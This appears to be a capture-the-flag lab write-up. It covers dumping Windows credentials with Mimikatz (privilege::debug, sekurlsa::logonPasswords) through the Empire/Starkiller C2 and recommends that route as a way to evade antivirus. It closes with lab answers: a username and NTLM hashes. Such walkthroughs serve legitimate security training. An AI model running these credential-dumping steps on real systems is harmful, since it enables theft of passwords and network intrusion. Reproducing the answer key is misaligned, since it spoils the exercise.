# Not the soft and fluffy kind
- From the previous task, we know the command syntax for Mimikatz. we now need an easy way to get it on the machine and execute Mimikatz commands. This can be done by getting a Mimikatz binary and putting it on the machine, however this will get picked up almost instantly by pretty much every AV, to make life easier and bypass AV you can utilize a c2 like empire to load a Mimikatz module and execute commands remotely. We already have a responding agent on THROWBACK-PROD so we can continue to use our agent with elevated privileges.



## Go to Starkiller C2 and use the mimikatz/command module
`powershell/credentials/mimikatz/command`

- Write the following command
```
privilege::debug
```

## Dumping logon passwords of different users
```
sekurlsa::logonPasswords
```

Then go the credentials tab and see the results collected there from this command
Go to `Miscellaneous Results\Credentials Harvested page in this blog to see the results collected in Credentials Panel of C2.`


Now that we have some hashes and passwords we can utilize further attacks with them to gain footholds onto more devices within the network.


## Questions
1. What domain user was logged in? 
`BlaireJ`

2. What is the user's hash?
`c374ecb7c2ccac1df3a82bce4f80bb5b`

3. What is the administrator's NTLM hash
`a06e58d15a2585235d18598788b8147a`
